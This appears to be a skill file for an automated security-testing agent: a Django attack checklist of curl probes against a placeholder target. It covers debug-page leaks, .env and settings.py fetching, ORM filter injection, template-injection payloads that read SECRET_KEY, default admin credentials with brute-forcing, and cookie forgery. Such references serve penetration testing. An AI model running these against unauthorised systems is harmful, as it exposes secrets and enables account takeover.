---
name: django
description: Django-specific security testing covering debug mode RCE, SSTI, ORM injection, admin panel exploitation, and settings exposure
---

# Django Security Testing

## Key Vulnerabilities

### Debug Mode

```bash
# Check if DEBUG=True (detailed error pages with stack traces, settings, SQL queries)
curl -sk "https://TARGET/nonexistent-path-xalgorix" | grep -iE "django|traceback|settings|DEBUG"
# Debug toolbar
curl -sk "https://TARGET/__debug__/" | head -20
```

### Django Admin Panel

```bash
curl -sk "https://TARGET/admin/" | grep -i "django\|admin"
# Default credentials: admin/admin, admin/password, admin/django
# Brute-force with common passwords
```

### ORM Injection

```bash
# Django ORM supports field lookups — injectable via query params
curl -sk "https://TARGET/api/users?username__startswith=a"
curl -sk "https://TARGET/api/users?password__regex=.*"
curl -sk "https://TARGET/api/users?is_superuser=true"
curl -sk "https://TARGET/api/users?email__contains=@admin"
# These bypass authentication if filter params are exposed
```

### SSTI (Template Injection)

```bash
# Django templates
curl -sk "https://TARGET/page?name={{settings.SECRET_KEY}}"
curl -sk "https://TARGET/page?name={{request.META}}"
# Jinja2 (if used instead of Django templates)
curl -sk "https://TARGET/page?name={{config.items()}}"
```

### Settings Exposure

```bash
# Common misconfigurations
curl -sk "https://TARGET/settings.py"
curl -sk "https://TARGET/.env"
curl -sk "https://TARGET/api/debug/settings"
# Django Channels WebSocket
curl -sk "https://TARGET/ws/" -H "Upgrade: websocket"
```

## Pro Tips

1. Django debug mode exposes SECRET_KEY, database credentials, and full stack traces
2. ORM field lookups (`__startswith`, `__regex`, `__contains`) are powerful injection vectors
3. Django REST Framework browsable API often exposes model fields and relationships
4. Check for `django.contrib.admindocs` at `/admin/doc/` — reveals all URL patterns
5. Django's `SECRET_KEY` in debug output enables session cookie forgery
